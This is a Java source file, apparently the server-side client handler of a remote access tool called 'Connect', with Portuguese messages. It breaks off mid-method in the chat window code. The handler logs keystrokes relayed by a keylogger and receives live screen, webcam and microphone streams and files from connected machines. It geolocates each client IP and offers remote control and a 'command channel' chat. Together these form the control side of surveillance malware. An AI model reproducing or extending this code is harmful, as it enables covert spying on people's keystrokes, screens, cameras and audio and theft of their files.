package br.com.introcdc.connect.server.connection;
/*
 * Written by IntroCDC, Bruno Coêlho at 15/01/2025 - 18:10
 */

import br.com.introcdc.connect.Connect;
import br.com.introcdc.connect.server.ConnectServer;
import br.com.introcdc.connect.server.components.ServerAudioComponents;
import br.com.introcdc.connect.server.components.ServerControlComponents;
import br.com.introcdc.connect.server.components.ServerFileComponents;
import br.com.introcdc.connect.server.components.ServerImageComponents;
import br.com.introcdc.connect.server.components.settings.FileInfo;
import br.com.introcdc.connect.server.gui.ServerGUI;
import com.google.gson.JsonObject;

import javax.imageio.ImageIO;
import javax.sound.sampled.*;
import javax.swing.*;
import java.awt.*;
import java.awt.datatransfer.StringSelection;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.InputEvent;
import java.awt.event.KeyEvent;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;

public class ClientHandler implements Runnable {

    private final Socket clientSocket;
    private final int clientId;
    private String clientKey;
    private PrintWriter writer;
    private final String clientIp;
    private String installDate = "00/00/0000 - 00:00:00";
    private String clientName = "Desconhecido";
    private String location = "Não localizado";
    private String os = "Desconhecido";
    private String activeWindow = "Desconhecido";
    private boolean webcamLive = false;
    private boolean screenLive = false;
    private ServerSocket webcamSocket;
    private ServerSocket screenSocket;
    private ServerSocket audioUserSocket;
    private ServerSocket audioServerSocket;
    private ServerSocket viewSocket;
    private ServerSocket fileSocket;
    private long pingTest = 0L;
    private long screenMillis = 0L;
    private long webcamMillis = 0L;
    private boolean auth = false;
    private int screens = 0;
    private int webcams = 0;
    private long ping = 0;
    private boolean creatingList = false;
    private List<FileInfo> fileList = new ArrayList<>();
    private boolean creatingInfo = false;
    private StringBuilder infoBuilder = null;

    private BufferedImage screenImage;
    private BufferedImage webcamImage;

    public JFrame CHAT_FRAME;
    public JTextArea CHAT_TEXT;
    public JTextField CHAT_FIELD;
    public List<String> CHAT_MESSAGES = new ArrayList<>();

    public ClientHandler(Socket socket, int id) {
        this.clientSocket = socket;
        this.clientId = id;
        this.clientIp = clientSocket.getInetAddress().toString();
        this.location = ipLocation(this.clientIp);
        ConnectServer.msg("Recebendo conexão #" + clientId + " (" + clientIp + "/" + this.location + ")...");
    }

    public Socket getClientSocket() {
        return clientSocket;
    }

    public int getClientId() {
        return clientId;
    }

    public String getClientIP() {
        return clientIp;
    }

    public String getClientName() {
        return clientName;
    }

    public String getClientInfo() {
        return "#" + getClientId() + " (" + getClientName() + getClientIP() + ")";
    }

    public String getClientKey() {
        return clientKey;
    }

    public void send(String message) {
        if (message.equalsIgnoreCase("ping")) {
            pingTest = System.currentTimeMillis();
        }
        if (this.writer != null) {
            this.writer.println(message);
            this.writer.flush();
        }
        ConnectServer.addBytes(message.length(), true);
    }

    @Override
    public void run() {
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
             PrintWriter writer = new PrintWriter(clientSocket.getOutputStream(), true)) {

            this.writer = writer;
            String command;
            while ((command = reader.readLine()) != null) {
                ConnectServer.addBytes(command.length(), false);
                if (command.startsWith("connect:")) {
                    String info = command.replace("connect:", "");
                    String[] args = info.split("\\|");
                    if (args.length != 4) {
                        closeConnection("Conexão com o cliente " + getClientIP() + " não identificada! (" + this.location + ")");
                        ServerAudioComponents.generateBeep(100, 250, true);
                        break;
                    }
                    clientKey = args[0];
                    clientName = args[1];
                    installDate = args[2];
                    os = args[3];
                    if (ConnectServer.CONNECTED_KEYS.contains(clientKey) && ConnectServer.DISCONNECT_DUPLICATE) {
                        break;
                    }
                    auth = true;
                    ConnectServer.CONNECTED_KEYS.add(clientKey);
                    ConnectServer.msg("Conexão com cliente " + getClientInfo() + " estabelecida!");
                    ServerGUI.addClientToTable(getClientKey(), null, null, getClientName(), getClientIP(), installDate, location, os, webcams, screens, ping, activeWindow);
                    ServerAudioComponents.generateBeep(100, 1500, true);
                } else if (command.startsWith("updateinfo ")) {
                    String[] args = command.split(" ", 4);
                    screens = Integer.parseInt(args[1]);
                    webcams = Integer.parseInt(args[2]);
                    activeWindow = args[3].isEmpty() ? "Área de Trabalho" : args[3];
                    if (getClientName().equalsIgnoreCase("Desconhecido")) {
                        continue;
                    }
                    ServerGUI.updateClientTable(getClientKey(), screenImage, webcamImage, "#" + getClientId() + " " + getClientName(), getClientIP(), installDate, location, os, webcams, screens, ping, activeWindow);
                    pingTest = System.currentTimeMillis();
                    send("r-ping");
                } else if (command.equalsIgnoreCase("icon-screen") || command.equalsIgnoreCase("icon-webcam")) {
                    boolean webcam = command.equalsIgnoreCase("icon-webcam");
                    new Thread(() -> {
                        boolean first = true;
                        JLabel label = null;
                        try (ServerSocket serverSocket = new ServerSocket(Connect.PORT + (webcam ? 10 : 9))) {
                            try (Socket clientSocket = serverSocket.accept();
                                 InputStream is = clientSocket.getInputStream()) {
                                BufferedImage receivedImage = ImageIO.read(is);
                                new Thread(() -> {
                                    try (ByteArrayOutputStream bos = new ByteArrayOutputStream()) {
                                        ImageIO.write(receivedImage, "png", bos);
                                        ConnectServer.addBytes(bos.toByteArray().length, false);
                                    } catch (Exception ignored) {
                                    }
                                }).start();
                                if (webcam) {
                                    webcamImage = receivedImage;
                                } else {
                                    screenImage = receivedImage;
                                }
                                ServerGUI.updateClientTable(getClientKey(), screenImage, webcamImage, "#" + getClientId() + " " + getClientName(), getClientIP(), installDate, location, os, webcams, screens, ping, activeWindow);
                            }
                        } catch (Exception exception) {
                            if (exception.getMessage() != null && exception.getMessage().equalsIgnoreCase("Socket closed")) {
                                return;
                            }
                            ConnectServer.msg(getClientInfo() + ": Ocorreu um erro ao abrir o servidor de icone");
                        }
                    }).start();
                } else if (!auth) {
                    closeConnection("Conexão com o cliente " + getClientIP() + " não identificada! (" + this.location + ")");
                    ServerAudioComponents.generateBeep(100, 250, true);
                    break;
                } else if (command.equalsIgnoreCase("ping")) {
                    ConnectServer.msg(getClientInfo() + ": " + (System.currentTimeMillis() - pingTest) + "ms");
                } else if (command.startsWith("chat-msg:")) {
                    String message = command.substring(9);
                    if (!message.isEmpty()) {
                        showChat(getClientInfo() + ": " + message);
                    }
                } else if (command.startsWith("chat-log:")) {
                    String message = command.substring(9);
                    if (!message.isEmpty()) {
                        showChat(message);
                    }
                } else if (command.equalsIgnoreCase("r-ping")) {
                    ping = System.currentTimeMillis() - pingTest;
                    ServerGUI.updateClientTable(getClientKey(), screenImage, webcamImage, "#" + getClientId() + " " + getClientName(), getClientIP(), installDate, location, os, webcams, screens, ping, activeWindow);
                } else if (command.startsWith("keylogger ")) {
                    ConnectServer.msg(getClientInfo() + ": Tecla: " + command.substring(10));
                } else if (command.equalsIgnoreCase("screen-image") || command.equalsIgnoreCase("screen-live") ||
                        command.equalsIgnoreCase("webcam-image") || command.equalsIgnoreCase("webcam-live")
                        || command.equalsIgnoreCase("view-image")) {
                    String cmd = command;
                    boolean webcam = command.startsWith("webcam");
                    boolean view = command.equalsIgnoreCase("view-image");
                    ConnectServer.msg(getClientInfo() + ": Recebendo " + (cmd.contains("-live") ? "transmissão de " : "") +
                            (view ? "visualização de imagem" : webcam ? "webcam" : "tela") + " do cliente...");
                    if (!view) {
                        if (webcam && webcamSocket != null) {
                            webcamLive = cmd.contains("-live");
                            webcamSocket.close();
                        } else if (!webcam && screenSocket != null) {
                            screenLive = cmd.contains("-live");
                            screenSocket.close();
                        }
                    }
                    new Thread(() -> {
                        boolean first = true;
                        JLabel label = null;
                        try (ServerSocket serverSocket = new ServerSocket(Connect.PORT + (view ? 5 : webcam ? 2 : 1))) {
                            if (view) {
                                viewSocket = serverSocket;
                            } else if (webcam) {
                                webcamSocket = serverSocket;
                            } else {
                                screenSocket = serverSocket;
                            }
                            while (((webcam && webcamLive) || (!webcam && screenLive)) || first) {
                                try (Socket clientSocket = serverSocket.accept();
                                     InputStream is = clientSocket.getInputStream()) {

                                    if (cmd.contains("-live")) {
                                        BufferedImage receivedImage = ImageIO.read(is);
                                        new Thread(() -> {
                                            try (ByteArrayOutputStream bos = new ByteArrayOutputStream()) {
                                                ImageIO.write(receivedImage, "png", bos);
                                                ConnectServer.addBytes(bos.toByteArray().length, false);
                                            } catch (Exception ignored) {
                                            }
                                        }).start();
                                        if (first) {
                                            first = false;
                                            label = ServerImageComponents.openLiveImage(receivedImage, getClientInfo() + " (" + (webcam ? "Webcam" : "Screen") + ")",
                                                    " | 0/" + ServerImageComponents.FPS + " FPS" + (!webcam && screenLive && ServerControlComponents.CONTROL ?
                                                            " | CONTROLE REMOTO" : ""), !webcam);
                                        } else {
                                            if (label == null) {
                                                label = ServerImageComponents.openLiveImage(receivedImage, getClientInfo() + " (" + (webcam ? "Webcam" : "Screen") + ")",
                                                        " | 0/" + ServerImageComponents.FPS + " FPS" + (!webcam && screenLive && ServerControlComponents.CONTROL ?
                                                                " | CONTROLE REMOTO" : ""), !webcam);
                                            } else {
                                                ServerImageComponents.updateLiveImage(receivedImage, label, !webcam);
                                            }
                                            long currentMillis = System.currentTimeMillis();
                                            long delta = currentMillis - (webcam ? webcamMillis : screenMillis);

                                            int updatesPerSecond = (int) (1000 / Math.max(delta, 1));
                                            JFrame frame;
                                            if (webcam) {
                                                frame = ServerImageComponents.WEBCAM_FRAME;
                                            } else {
                                                frame = ServerImageComponents.SCREEN_FRAME;
                                            }
                                            frame.setTitle(getClientInfo() + " (" + (webcam ? "Webcam" : "Screen") + ") (" + receivedImage.getWidth() +
                                                    " x " + receivedImage.getHeight() + ") | " + System.currentTimeMillis() + " | " + updatesPerSecond +
                                                    "/" + ServerImageComponents.FPS + " FPS" + (!webcam && screenLive && ServerControlComponents.CONTROL ? " | CONTROLE REMOTO" : ""));
                                        }
                                        if (webcam) {
                                            webcamMillis = System.currentTimeMillis();
                                        } else {
                                            screenMillis = System.currentTimeMillis();
                                        }
                                    } else {
                                        first = false;
                                        BufferedImage receivedImage = ImageIO.read(is);
                                        new Thread(() -> {
                                            try (ByteArrayOutputStream bos = new ByteArrayOutputStream()) {
                                                ImageIO.write(receivedImage, "png", bos);
                                                ConnectServer.addBytes(bos.toByteArray().length, false);
                                            } catch (Exception ignored) {
                                            }
                                        }).start();
                                        ServerImageComponents.openImage(receivedImage, getClientInfo() + " (" +
                                                (view ? "Visualização de Imagem" : webcam ? "Webcam" : "Screen") + ")");
                                    }
                                }
                            }
                        } catch (Exception exception) {
                            if (exception.getMessage() != null && exception.getMessage().equalsIgnoreCase("Socket closed")) {
                                return;
                            }
                            ConnectServer.msg(getClientInfo() + ": Ocorreu um erro ao abrir o servidor de receber arquivo");
                        }
                    }).start();
                } else if (command.equalsIgnoreCase("audio-user") || command.equalsIgnoreCase("audio-server")) {
                    boolean fromUser = command.equalsIgnoreCase("audio-user");
                    ConnectServer.msg(getClientInfo() + ": Recebendo transmissão de áudio " + (fromUser ? "do cliente para o servidor" :
                            "do servidor para o cliente") + "...");
                    new Thread(() -> {
                        try {
                            SourceDataLine speakers = null;
                            TargetDataLine microphone = null;
                            if (fromUser) {
                                try {
                                    if (audioUserSocket != null) {
                                        audioUserSocket.close();
                                    }
                                } catch (Exception ignored) {
                                }
                                speakers = getSourceDataLine();
                                if (speakers == null) {
                                    ConnectServer.msg("Alto-falante do servidor não encontrado!");
                                    return;
                                }
                                ServerAudioComponents.AUDIO_USER = true;
                            } else {
                                try {
                                    if (audioServerSocket != null) {
                                        audioServerSocket.close();
                                    }
                                } catch (Exception ignored) {
                                }
                                microphone = getTargetDataLine();
                                if (microphone == null) {
                                    ConnectServer.msg("Microfone do servidor não encontrado!");
                                    return;
                                }
                                ServerAudioComponents.AUDIO_SERVER = true;
                            }

                            SourceDataLine speakersInfo = speakers;
                            TargetDataLine microphoneInfo = microphone;

                            new Thread(() -> {
                                try (ServerSocket serverSocket = new ServerSocket(Connect.PORT + (fromUser ? 7 : 8))) {
                                    Socket clientSocket = serverSocket.accept();
                                    ConnectServer.msg(getClientInfo() + ": Transmissão de áudio estabelecida, executando...");

                                    if (fromUser) {
                                        audioUserSocket = serverSocket;
                                    } else {
                                        audioServerSocket = serverSocket;
                                    }

                                    try {
                                        if (fromUser) {
                                            InputStream in = clientSocket.getInputStream();

                                            byte[] buffer = new byte[4096];
                                            int bytesRead;
                                            if (ServerGUI.AUDIO_USER != null) {
                                                ServerGUI.AUDIO_USER.setBackground(Color.GREEN);
                                            }

                                            try {
                                                while (ServerAudioComponents.AUDIO_USER && (bytesRead = in.read(buffer)) != -1) {
                                                    speakersInfo.write(buffer, 0, bytesRead);
                                                    ConnectServer.addBytes(bytesRead, false);
                                                }
                                            } catch (Exception exception) {
                                                ConnectServer.msg(getClientInfo() + ": Ocorreu um erro na reprodução do servidor de áudio por parte do servidor do cliente para o servidor (" + exception.getMessage() + ")");
                                                if (ServerGUI.AUDIO_USER != null) {
                                                    ServerGUI.AUDIO_USER.setBackground(Color.RED);
                                                }
                                            } finally {
                                                speakersInfo.close();
                                                clientSocket.close();
                                                try {
                                                    serverSocket.close();
                                                } catch (Exception ignored) {
                                                }
                                                ConnectServer.msg(getClientInfo() + ": Transmissão de áudio do cliente para o servidor finalizada");
                                                if (ServerGUI.AUDIO_USER != null) {
                                                    ServerGUI.AUDIO_USER.setBackground(Color.RED);
                                                }
                                            }
                                        } else {
                                            OutputStream out = clientSocket.getOutputStream();
                                            byte[] buffer = new byte[4096];

                                            if (ServerGUI.AUDIO_SERVER != null) {
                                                ServerGUI.AUDIO_SERVER.setBackground(Color.GREEN);
                                            }
                                            try {
                                                while (ServerAudioComponents.AUDIO_SERVER) {
                                                    int bytesRead = microphoneInfo.read(buffer, 0, buffer.length);
                                                    if (bytesRead == -1) break;
                                                    out.write(buffer, 0, bytesRead);
                                                    ConnectServer.addBytes(bytesRead, true);
                                                }
                                            } catch (Exception exception) {
                                                ConnectServer.msg(getClientInfo() + ": Ocorreu um erro na reprodução do servidor de áudio por parte do servidor do cliente para o servidor (" + exception.getMessage() + ")");
                                                if (ServerGUI.AUDIO_SERVER != null) {
                                                    ServerGUI.AUDIO_SERVER.setBackground(Color.RED);
                                                }
                                            } finally {
                                                microphoneInfo.close();
                                                clientSocket.close();
                                                ConnectServer.msg(getClientInfo() + ": Transmissão de áudio do servidor para o cliente finalizada");
                                                try {
                                                    serverSocket.close();
                                                } catch (Exception ignored) {
                                                }
                                                if (ServerGUI.AUDIO_SERVER != null) {
                                                    ServerGUI.AUDIO_SERVER.setBackground(Color.RED);
                                                }
                                            }
                                        }
                                    } catch (Exception exception) {
                                        ConnectServer.msg(getClientInfo() + ": Ocorreu um erro na execução do servidor de áudio por parte do servidor " + (fromUser ? "do cliente para o servidor" : "do servidor para o cliente") + " (" + exception.getMessage() + ")");
                                        if (fromUser) {
                                            try {
                                                if (audioUserSocket != null) {
                                                    audioUserSocket.close();
                                                }
                                            } catch (Exception ignored) {
                                            }
                                            try {
                                                speakersInfo.close();
                                            } catch (Exception ignored) {
                                            }
                                            if (ServerGUI.AUDIO_USER != null) {
                                                ServerGUI.AUDIO_USER.setBackground(Color.RED);
                                            }
                                        } else {
                                            try {
                                                if (audioServerSocket != null) {
                                                    audioServerSocket.close();
                                                }
                                            } catch (Exception ignored) {
                                            }
                                            try {
                                                microphoneInfo.close();
                                            } catch (Exception ignored) {
                                            }
                                            if (ServerGUI.AUDIO_SERVER != null) {
                                                ServerGUI.AUDIO_SERVER.setBackground(Color.RED);
                                            }
                                        }
                                    }
                                } catch (Exception exception) {
                                    if (exception.getMessage().equalsIgnoreCase("Socket closed")) {
                                        return;
                                    }
                                    ConnectServer.msg(getClientInfo() + ": Ocorreu um erro na execução do servidor de áudio por parte do servidor " + (fromUser ? "do cliente para o servidor" : "do servidor para o cliente") + " (" + exception.getMessage() + ")");
                                    if (fromUser) {
                                        try {
                                            if (audioUserSocket != null) {
                                                audioUserSocket.close();
                                            }
                                        } catch (Exception ignored) {
                                        }
                                        try {
                                            speakersInfo.close();
                                        } catch (Exception ignored) {
                                        }
                                        if (ServerGUI.AUDIO_USER != null) {
                                            ServerGUI.AUDIO_USER.setBackground(Color.RED);
                                        }
                                    } else {
                                        try {
                                            if (audioServerSocket != null) {
                                                audioServerSocket.close();
                                            }
                                        } catch (Exception ignored) {
                                        }
                                        try {
                                            microphoneInfo.close();
                                        } catch (Exception ignored) {
                                        }
                                        if (ServerGUI.AUDIO_SERVER != null) {
                                            ServerGUI.AUDIO_SERVER.setBackground(Color.RED);
                                        }
                                    }
                                }
                            }).start();
                        } catch (Exception exception) {
                            ConnectServer.msg("Ocorreu um erro ao processar o servidor de áudio por parte do servidor! (" + exception.getMessage() + ")");
                            if (fromUser) {
                                try {
                                    if (audioUserSocket != null) {
                                        audioUserSocket.close();
                                    }
                                } catch (Exception ignored) {
                                }
                            } else {
                                try {
                                    if (audioServerSocket != null) {
                                        audioServerSocket.close();
                                    }
                                } catch (Exception ignored) {
                                }
                            }
                        }
                    }).start();
                } else if (command.startsWith("stoplivewebcam")) {
                    if (webcamLive) {
                        ConnectServer.msg(getClientInfo() + ": Transmissão da webcam finalizada! (" + command.replace("stoplivewebcam", "") + ")");
                    }
                    webcamLive = false;
                    if (ServerImageComponents.WEBCAM_STOP != null) {
                        ServerImageComponents.WEBCAM_STOP.setEnabled(false);
                        ServerImageComponents.WEBCAM_STOP.setText("Transmissão Parada");
                    }
                } else if (command.startsWith("stoplivescreen")) {
                    if (screenLive) {
                        ConnectServer.msg(getClientInfo() + ": Transmissão da tela finalizada! (" + command.replace("stoplivescreen", "") + ")");
                    }
                    screenLive = false;
                    if (ServerImageComponents.SCREEN_STOP != null) {
                        ServerImageComponents.SCREEN_STOP.setEnabled(false);
                        ServerImageComponents.SCREEN_STOP.setText("Transmissão Parada");
                    }
                } else if (command.startsWith("stopliveaudiouser")) {
                    if (ServerAudioComponents.AUDIO_USER) {
                        ConnectServer.msg(getClientInfo() + ": Transmissão de áudio do usuário finalizada! (" + command.replace("stopliveaudiouser", "") + ")");
                    }
                    ServerAudioComponents.AUDIO_USER = false;
                    if (ServerGUI.AUDIO_USER != null) {
                        ServerGUI.AUDIO_USER.setBackground(Color.RED);
                    }
                } else if (command.startsWith("stopliveaudioserver")) {
                    if (ServerAudioComponents.AUDIO_SERVER) {
                        ConnectServer.msg(getClientInfo() + ": Transmissão de áudio do servidor finalizada! (" + command.replace("stopliveaudioserver", "") + ")");
                    }
                    ServerAudioComponents.AUDIO_SERVER = false;
                    if (ServerGUI.AUDIO_SERVER != null) {
                        ServerGUI.AUDIO_SERVER.setBackground(Color.RED);
                    }
                } else if (command.equalsIgnoreCase("receive-file")) {
                    ConnectServer.msg(getClientInfo() + ": Recebendo arquivo do cliente...");
                    ConnectServer.EXECUTOR.schedule(() -> new Thread(() -> {
                        try (ServerSocket serverSocket = new ServerSocket(Connect.PORT + 3)) {
                            fileSocket = serverSocket;
                            try (Socket clientSocket = serverSocket.accept();
                                 DataInputStream dis = new DataInputStream(clientSocket.getInputStream());
                                 BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream("connect/" + dis.readUTF()))) {

                                byte[] buffer = new byte[4096];
                                int bytesRead;
                                while ((bytesRead = dis.read(buffer)) != -1) {
                                    bos.write(buffer, 0, bytesRead);
                                    ConnectServer.addBytes(bytesRead, false);
                                }

                                ConnectServer.msg(getClientInfo() + ": Arquivo recebido!");
                            } catch (Exception exception) {
                                ConnectServer.msg(getClientInfo() + ": Erro ao receber arquivo - " + exception.getMessage());
                            }
                        } catch (Exception exception) {
                            ConnectServer.msg(getClientInfo() + ": Ocorreu um erro ao receber um arquivo do cliente");
                        }
                    }).start(), 100, TimeUnit.MILLISECONDS);
                } else {
                    ConnectServer.msg(getClientInfo() + ": " + command);
                    if (command.contains("Interfaces USB:") || command.contains("Separador de Linha:")) {
                        ConnectServer.msg(getClientInfo() + ": IP: " + getClientIP() + " (" + this.location + ")");
                    } else if (command.startsWith("> Pasta ")) {
                        if (creatingList) {
                            creatingList = false;
                            ServerFileComponents.createFileNavigator(fileList, command);
                            fileList.clear();
                        } else {
                            creatingList = true;
                            fileList.clear();
                        }
                    } else if (command.startsWith("INFO: ")) {
                        creatingInfo = true;
                        infoBuilder = new StringBuilder(command);
                    } else {
                        if (creatingList) {
                            Matcher matcher = ServerFileComponents.LINE_PATTERN.matcher(command);
                            if (matcher.find()) {
                                boolean isDirectory = !matcher.group("slash").isEmpty();
                                int index = Integer.parseInt(matcher.group("index"));
                                String name = matcher.group("name").trim();
                                String info = matcher.group("info").trim();
                                fileList.add(new FileInfo(isDirectory, info, name, index));
                            }
                        } else if (creatingInfo && infoBuilder != null) {
                            infoBuilder.append("\n").append(command);
                            if (command.contains("Permissoes: R: ")) {
                                creatingInfo = false;
                                new Thread(() -> JOptionPane.showMessageDialog(ServerFileComponents.FRAME, infoBuilder.toString())).start();
                            }
                        }
                    }
                }
            }
        } catch (Exception exception) {
            closeConnection(exception.getMessage());
            return;
        }
        closeConnection("Conexão Finalizada");
    }

    public String ipLocation(String ip) {
        if (ip.contains("127.0.0.1") || ip.startsWith("192.168.") || ip.contains("localhost")) {
            return "IP Local";
        }
        try {
            JsonObject ipInfo = ServerControlComponents.readJson("http://ip-api.com/json/" + ip).getAsJsonObject();
            return ipInfo.get("city").getAsString() + "/" + ipInfo.get("regionName").getAsString() + "/" + ipInfo.get("country").getAsString();
        } catch (Exception exception) {
            return "Erro ao localizar ip: " + exception.getMessage();
        }
    }

    public void closeConnection(String message) {
        ConnectServer.msg("Cliente " + getClientInfo() + " desconectado. (" + message + ")");
        if (auth) {
            ConnectServer.CONNECTED_KEYS.remove(getClientKey());
        }
        ConnectServer.CLIENTS.remove(getClientId());
        ServerGUI.removeClientFromTable(getClientKey());

        // Remove o ID da combo na GUI
        ServerGUI.removeClient(String.valueOf(getClientId()));

        webcamLive = false;
        screenLive = false;
        ServerAudioComponents.AUDIO_SERVER = false;
        ServerAudioComponents.AUDIO_USER = false;

        if (viewSocket != null) {
            try {
                viewSocket.close();
            } catch (Exception ignored) {
            }
        }
        if (webcamSocket != null) {
            try {
                webcamSocket.close();
            } catch (Exception ignored) {
            }
        }
        if (screenSocket != null) {
            try {
                screenSocket.close();
            } catch (Exception ignored) {
            }
        }
        if (fileSocket != null) {
            try {
                fileSocket.close();
            } catch (Exception ignored) {
            }
        }
        if (audioServerSocket != null) {
            try {
                audioServerSocket.close();
            } catch (Exception ignored) {
            }
        }
        if (audioUserSocket != null) {
            try {
                audioUserSocket.close();
            } catch (Exception ignored) {
            }
        }
        if (clientSocket != null) {
            try {
                clientSocket.close();
            } catch (Exception ignored) {
            }
        }
        if (ConnectServer.SELECTED_CLIENT == getClientId()) {
            ConnectServer.SELECTED_CLIENT = 0;
        }

        ServerAudioComponents.generateBeep(100, 1500, false);
        ServerAudioComponents.generateBeep(100, 1250, false);
        ServerAudioComponents.generateBeep(100, 1000, false);
        ServerAudioComponents.generateBeep(100, 750, false);
        ServerAudioComponents.generateBeep(100, 500, false);
        ServerAudioComponents.generateBeep(100, 250, false);
    }

    public static final AudioFormat FORMAT = new AudioFormat(44100, 16, 2, true, true);

    private static SourceDataLine getSourceDataLine() {
        try {
            DataLine.Info info = new DataLine.Info(SourceDataLine.class, FORMAT);
            if (!AudioSystem.isLineSupported(info)) {
                return null;
            }

            SourceDataLine line = (SourceDataLine) AudioSystem.getLine(info);
            line.open(FORMAT);
            line.start();
            return line;
        } catch (Exception exception) {
            ConnectServer.msg("Ocorreu um erro ao capturar a informação do alto-falante do servidor! (" + exception.getMessage() + ")");
            return null;
        }
    }

    private static TargetDataLine getTargetDataLine() {
        try {
            DataLine.Info info = new DataLine.Info(TargetDataLine.class, FORMAT);
            if (!AudioSystem.isLineSupported(info)) {
                return null;
            }

            TargetDataLine line = (TargetDataLine) AudioSystem.getLine(info);
            line.open(FORMAT);
            line.start();
            return line;
        } catch (Exception exception) {
            ConnectServer.msg("Ocorreu um erro ao capturar a informação do microfone do servidor! (" + exception.getMessage() + ")");
        }
        return null;
    }

    public void showChat(String message) {
        if (CHAT_FRAME == null) {
            createChatFrame();
        }

        if (message != null && !message.isEmpty()) {
            addMessage(message);
        }

        if (!CHAT_FRAME.isVisible()) {
            CHAT_FRAME.setVisible(true);
        }
    }

    public void createChatFrame() {
        // Mantém o comportamento dark via Nimbus, mas dá uma turbinada "hacker"
        if (ServerGUI.DARK_MODE) {
            try {
                UIManager.setLookAndFeel("javax.swing.plaf.nimbus.NimbusLookAndFeel");
                UIManager.put("control", new Color(12, 14, 20));
                UIManager.put("text", Color.WHITE);
                UIManager.put("nimbusBase", new Color(18, 30, 49));
                UIManager.put("nimbusFocus", new Color(0, 255, 170));
                UIManager.put("nimbusLightBackground", new Color(16, 18, 24));
                UIManager.put("info", new Color(18, 18, 24));
                UIManager.put("nimbusSelectionBackground", new Color(80, 225, 200));
                UIManager.put("nimbusSelectedText", Color.BLACK);
                UIManager.put("nimbusDisabledText", new Color(120, 120, 120));
                UIManager.put("OptionPane.background", new Color(12, 14, 20));
                UIManager.put("Panel.background", new Color(12, 14, 20));
                UIManager.put("TextField.background", new Color(20, 22, 30));
                UIManager.put("TextField.foreground", Color.WHITE);
                UIManager.put("TextArea.background", new Color(17, 19, 26));
                UIManager.put("TextArea.foreground", new Color(225, 255, 245));
                UIManager.put("ComboBox.background", new Color(20, 22, 30));
                UIManager.put("ComboBox.foreground", Color.WHITE);
                UIManager.put("Button.background", new Color(24, 26, 34));
                UIManager.put("Button.foreground", new Color(220, 255, 240));
            } catch (Exception ignored) {
            }
        } else {
            try {
                UIManager.setLookAndFeel("javax.swing.plaf.nimbus.NimbusLookAndFeel");
            } catch (Exception ignored) {
            }
        }

        // === FRAME ===
        CHAT_FRAME = new JFrame("Chat — " + getClientInfo());
        CHAT_FRAME.setSize(600, 500); // mantém proporção original
        CHAT_FRAME.setLocationRelativeTo(null);
        try {
            ImageIcon icon = new ImageIcon(ClientHandler.class.getResource("/eye.png"));
            CHAT_FRAME.setIconImage(icon.getImage());
        } catch (Exception ignored) {
        }

        // === HEADER (faixa com degradê e título) ===
        JPanel header = new NeonGradientPanel(new Color(14, 16, 24), new Color(10, 12, 18));
        header.setLayout(new BorderLayout());
        header.setBorder(javax.swing.BorderFactory.createCompoundBorder(
                javax.swing.BorderFactory.createMatteBorder(0, 0, 1, 0, new Color(40, 255, 200, 80)),
                javax.swing.BorderFactory.createEmptyBorder(10, 12, 10, 12)
        ));

        JLabel title = new JLabel("Canal de Comando • " + getClientInfo());
        title.setFont(new Font("Consolas", Font.BOLD, 14));
        title.setForeground(new Color(160, 255, 230));
        title.setBorder(javax.swing.BorderFactory.createEmptyBorder(0, 0, 2, 0));

        JLabel subtitle = new JLabel("Chat • ao vivo");
        subtitle.setFont(new Font("Consolas", Font.PLAIN, 12));
        subtitle.setForeground(new Color(110, 210, 190));

        JPanel headerText = new JPanel(new GridLayout(2, 1));
        headerText.setOpaque(false);
        headerText.add(title);
        headerText.add(subtitle);

        // Botão rápido pra copiar todo o chat
        JButton copyAll = neonButton("Copiar tudo");
        copyAll.setToolTipText("Copia todo o histórico do chat p/ a área de transferência");
        copyAll.addActionListener(e -> {
            String all = CHAT_TEXT != null ? CHAT_TEXT.getText() : "";
            if (!all.isEmpty()) {
                Toolkit.getDefaultToolkit().getSystemClipboard().setContents(new StringSelection(all), null);
            }
        });

        JPanel headerRight = new JPanel(new FlowLayout(FlowLayout.RIGHT, 8, 0));
        headerRight.setOpaque(false);
        headerRight.add(copyAll);

        header.add(headerText, BorderLayout.WEST);
        header.add(headerRight, BorderLayout.EAST);

        // === ÁREA DE TEXTO ===
        CHAT_TEXT = new JTextArea();
        CHAT_TEXT.setEditable(false);
        CHAT_TEXT.setFont(new Font("Consolas", Font.PLAIN, 13));
        CHAT_TEXT.setForeground(new Color(220, 255, 240));
        CHAT_TEXT.setBackground(new Color(17, 19, 26));
        CHAT_TEXT.setBorder(javax.swing.BorderFactory.createEmptyBorder(8, 10, 8, 10));

        // Menu de contexto (copiar/limpar)
        javax.swing.JPopupMenu textMenu = new javax.swing.JPopupMenu();
        JMenuItem miCopySel = new JMenuItem("Copiar seleção");
        miCopySel.addActionListener(e -> {
            String sel = CHAT_TEXT.getSelectedText();
            if (sel != null && !sel.isEmpty()) {
                Toolkit.getDefaultToolkit().getSystemClipboard().setContents(new StringSelection(sel), null);
            }
        });
        JMenuItem miCopyAll = new JMenuItem("Copiar tudo");
        miCopyAll.addActionListener(e -> {
            Toolkit.getDefaultToolkit().getSystemClipboard().setContents(new StringSelection(CHAT_TEXT.getText()), null);
        });
        JMenuItem miClear = new JMenuItem("Limpar (local)");
        miClear.addActionListener(e -> {
            CHAT_TEXT.setText("");
            CHAT_MESSAGES.clear();
        });
        textMenu.add(miCopySel);
        textMenu.add(miCopyAll);
        textMenu.addSeparator();
        textMenu.add(miClear);
        CHAT_TEXT.setComponentPopupMenu(textMenu);

        JScrollPane scrollPane = new JScrollPane(CHAT_TEXT);
        scrollPane.setBorder(javax.swing.BorderFactory.createCompoundBorder(
                javax.swing.BorderFactory.createLineBorder(new Color(40, 255, 200, 90), 1, true),
                javax.swing.BorderFactory.createEmptyBorder(2, 2, 2, 2)
        ));
        // Scrollbar minimalista (sem import extra)
        scrollPane.getVerticalScrollBar().setUI(new javax.swing.plaf.basic.BasicScrollBarUI() {
            @Override
            protected void configureScrollBarColors() {
                this.thumbColor = new Color(40, 255, 200, 90);
                this.trackColor = new Color(14, 16, 22);
            }
        });
        scrollPane.getHorizontalScrollBar().setUI(new javax.swing.plaf.basic.BasicScrollBarUI() {
            @Override
            protected void configureScrollBarColors() {
                this.thumbColor = new Color(40, 255, 200, 90);
